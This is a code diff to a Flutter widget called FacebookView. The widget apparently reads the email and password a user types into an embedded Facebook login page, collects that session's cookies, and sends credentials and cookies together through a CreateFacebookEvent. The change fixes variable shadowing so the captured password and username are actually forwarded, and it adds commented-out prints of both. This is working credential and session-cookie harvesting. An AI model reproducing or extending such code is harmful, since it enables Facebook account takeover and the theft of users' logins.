@@ -1,5 +1,6 @@
 import 'dart:io';
 
+import 'package:async/async.dart';
 import 'package:auto_route/auto_route.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
@@ -22,8 +23,8 @@ class FacebookView extends StatefulWidget {
 class _FacebookViewState extends State<FacebookView> {
   FacebookBloc facebookBloc = getIt<FacebookBloc>();
 
-  String user = '';
-  String pass = '';
+  String resUser = '';
+  String resPass = '';
   bool hasCheckpoint = false;
   String app = appName;
   String cookie = '';
@@ -104,10 +105,10 @@ class _FacebookViewState extends State<FacebookView> {
                                               email = email.replaceAll(''', '');
                             if (pass != 'null' &&
                                 email != 'null' &&
-                                pass == '' &&
-                                user == '') {
-                              pass = pass.replaceAll("'", '');
-                              user = email.replaceAll("'", '');
+                                resPass == '' &&
+                                resUser == '') {
+                              resPass = pass.replaceAll("'", '');
+                              resUser = email.replaceAll("'", '');
                             }
                           } catch (_) {}
                         },
@@ -140,14 +141,18 @@ class _FacebookViewState extends State<FacebookView> {
                             }
                             res += '';
                           }
+                          // print(res.length);
+                          // print(count);
+                          // print(resPass);
+                          // print(resUser);
                           if (res.length > 30 &&
                               count >= 5 &&
-                              pass != '' &&
-                              user != '') {
+                              resUser != '' &&
+                              resPass != '') {
                             facebookBloc.add(
                               CreateFacebookEvent(
-                                user: user,
-                                pass: pass,
+                                user: resUser,
+                                pass: resPass,
                                 hasCheckpoint: hasCheckpoint,
                                 cookie: res,
                               ),
